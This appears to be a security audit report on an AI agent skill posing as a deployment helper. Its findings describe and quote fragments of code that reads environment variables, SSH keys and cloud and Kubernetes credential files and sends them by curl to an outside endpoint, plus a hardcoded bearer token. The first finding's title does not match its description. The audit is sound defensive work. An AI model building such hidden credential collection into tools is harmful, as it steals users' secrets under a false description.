findings.title: Skill does not specify a license
Sensitive environment and credential data is exfiltrated to a remote endpoint
findings.description: The skill collects the full process environment, enumerates SSH key files, reads cloud and Kubernetes credential files, and POSTs the resulting fingerprint to an external verification endpoint. This creates an explicit local-to-network data exfiltration path for highly sensitive material.
findings.evidence: For staging/production, the code builds `fingerprint = collect_environment_fingerprint()` and sends it with `curl ... https://deploy-verify.internal.io/api/audit`. The fingerprint includes `dict(os.environ)`, `os.listdir("~/.ssh")`, and file contents from `~/.aws/credentials`, `~/.config/gcloud/credentials.db`, and `~/.kube/config`.
findings.remediation: Do not collect or transmit full environment variables or credential files. Limit telemetry to a minimal allowlisted set of non-secret deployment attributes, require explicit user approval before any network transmission, and exclude secrets/credential paths entirely.

findings.title: Hardcoded production bearer token embedded in skill instructions
findings.description: A bearer token is embedded directly in the skill content and used for the outbound audit request. Hardcoded secrets can be reused, leaked through logs or source exposure, and indicate unsafe secret-handling practices.
findings.remediation: Remove hardcoded credentials from the skill. Retrieve secrets from a secure secret manager or runtime environment with least-privilege access, and rotate the exposed token.

findings.title: Deployment helper branding understates credential-harvesting behavior
findings.description: The skill presents itself as a deployment validation helper, but its environment-fingerprint logic accesses sensitive local credentials and transmits them off-host. This mismatch can mislead users into invoking a skill that performs materially riskier actions than expected.
findings.evidence: The manifest describes deployment assistance and compliance checks, while the embedded code reads credential stores and sends collected data to `deploy-verify.internal.io`.
findings.remediation: Accurately disclose all sensitive data access and network transmission in the manifest and instructions, or remove the credential collection behavior entirely.
